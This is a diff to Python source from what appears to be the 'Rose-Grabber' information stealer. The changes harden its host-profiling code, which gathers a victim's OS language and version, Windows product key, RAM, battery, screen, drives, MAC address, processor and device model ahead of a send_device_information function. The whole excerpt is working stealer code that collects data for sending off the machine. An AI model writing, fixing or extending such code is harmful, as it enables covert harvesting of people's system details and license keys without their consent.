@@ -67,10 +67,11 @@ if iface:
             # For some reason this may result in an error (https://github.com/DamagingRose/Rose-Grabber/issues/167)
             # pywifi/profile.py already initializes an SSID variable, so why this happens in unknown.
 
-lang = subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]
-system = str(subprocess.check_output('wmic os get Caption /format:list').decode().strip().split('\r\r\n')[0].split('=')[1])
+lang = subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1] if subprocess.check_output('wmic os get MUILanguages /format:list', shell=True).decode().strip() else "No Language"
+system_output = subprocess.check_output('wmic os get Caption /format:list', shell=True).decode().strip()
+system = str(system_output.split('\r\r\n')[0].split('=')[1]) if system_output else "No System Information"
 output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
-product_key = str(output.split('\n', 1)[-1].strip())
+product_key = str(output.split('\n', 1)[-1].strip()) if output else "No Product Key"
 ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
 power = str(psutil.sensors_battery().percent) + "%" if psutil.sensors_battery() is not None else "No battery"
 screen = f"{pyautogui.size()[0]}x{pyautogui.size()[1]}"
@@ -88,7 +89,7 @@ drives = get_drive_info()
 drive_info_string = str(format_drive_info(drives))
 mac_address = str(':'.join(['{:02X}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(0,2*6,2)][::-1]))
 processor_id = str(platform.processor())
-device_model = if (str(subprocess.check_output("wmic csproduct get name"), "utf-8").split("\n")[1].strip()) is not None else "No Device Model"
+device_model = (lambda output: output.split("\n")[1].strip() if output else "No Device Model")(str(subprocess.check_output("wmic csproduct get name"), "utf-8"))
 current_time_iso = datetime.now().isoformat()
 
 def send_device_information():
